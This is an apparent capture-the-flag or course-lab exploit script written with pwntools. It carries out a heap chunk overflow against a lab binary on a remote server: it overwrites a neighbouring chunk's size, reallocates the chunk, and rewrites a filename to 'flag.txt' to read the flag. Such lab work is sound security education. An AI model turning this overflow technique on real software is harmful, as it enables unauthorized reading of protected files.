''' Script Module Importing '''from pwn import *import string''' Establish Connection '''p = remote("csc748.hostbin.org", 7092)      # Test Script Against Server# p = process("./9-2_lab.bin")              # Test Script Locally# p = gdb.debug("./9-2_lab.bin")            # Debug with GDB''' Initialize Globals '''chunk_ids = {}freed_chunks = set()CHUNK_SIZE = 24''' Define Functions '''def allocate_chunk(chunk_name, size, content):    ''' Allocate Chunk '''    p.sendlineafter(b"Choice: ", b'1')                  # Select Option (1) New to Allocate Chunk    p.sendlineafter(b"Size: ", str(size).encode())      # Set Size    p.sendlineafter(b"Contents: ", content)             # Fill Chunk    id_return = p.readuntil(b')')                       # Read until Closing Parenthesis    ''' Set ID Number '''    chunk_id = int(id_return                   .split(b'#')[1]                   .split(b')')[0])         # Extract ID Number    chunk_ids[chunk_name] = chunk_id        # Assign ID to Letter    ''' Print Updates'''    if chunk_name in freed_chunks:        message = f"Chunk '{chunk_name}' Re-Allocated "        if len(content) > size:            message = f"{message} and Overflowed Successfully"        if size > CHUNK_SIZE:            message = f"{message} and Resized Successfully"        print(f"    [-] {message} <ID #{chunk_ids[chunk_name]}>")        freed_chunks.remove(chunk_name)    elif content.endswith(b'flag.txt'):        print("    [!] Filename Updated to 'flag.txt' Successfully")    else:        print(f"    [-] Chunk '{chunk_name}' Allocated <ID #{chunk_ids[chunk_name]}>")def free_chunk(chunk_name):    ''' Free Chunk '''    chunk_id = chunk_ids[chunk_name]    p.sendlineafter(b"Choice: ", b'2')                  # Select Option (3) Delete    p.sendlineafter(b"ID?: ", str(chunk_id).encode())   # Free Chunk    freed_chunks.add(chunk_name)    ''' Print Update'''    print(f"    [-] Chunk '{chunk_name}' Freed <ID #{chunk_id}>")def obtain_flag():    p.sendlineafter(b"Choice: ", b'4')          # Select Option (4) Read file    p.recvuntil(b"contents: ")                  # Discard Program Output    flag = p.recvuntil(b"}").decode('utf-8')    # Extract Flag    return flagif __name__ == "__main__":    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''    ''' Step 1: Allocate Three Chunks - A, B, C '''    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''    print("\n[*] Allocating Chunks")    # Chunks A and B    for letter in 'AB':        allocate_chunk(letter, CHUNK_SIZE,                        bytes(letter * 16, 'utf-8'))             # Chunk C    p.sendlineafter(b"Choice: ", b'3')          # Select Option (3) Setup filename to Allocate Chunk 'C'    print("    [-] Chunk 'C' Allocated and 'Safe' Filename Set")    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''    ''' Step 2: Overflow A to Change Bâ€™s Size '''    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''    print("\n[*] Overflow Chunk A to Change Size of B")    free_chunk('A')                             # Free Chunk A    allocate_chunk('A', CHUNK_SIZE,                    b'A' * (CHUNK_SIZE + 1))     # Rewrite and Overflow A to change size of 'B' to 40    ''' ' ' ' ' ' ' ' ' '''    ''' Step 3:  Free B '''    ''' ' ' ' ' ' ' ' ' '''    print("\n[*] Free B ")    free_chunk('B')                             # Free Chunk B    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''    ''' Step 4: Allocate Chuck to New Size of B '''    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''    print("\n[*] Allocate Chuck to Resize B ")    payload = b'B' * 32 + b'flag.txt'           # Set Payload to Overwrite 'C' with 'flag.txt'    allocate_chunk('B', 56, payload)            # Re-Allocate B to New Size    ''' ' ' ' ' ' ' ' ' ' ' ' '''    ''' Step 5: Receive Flag  '''    ''' ' ' ' ' ' ' ' ' ' ' ' '''    print("\n[*] Reading Flag Chunk")    flag = obtain_flag()        print(f"    [!] Flag Successfully Obtained: {flag}\n")      # Print Flag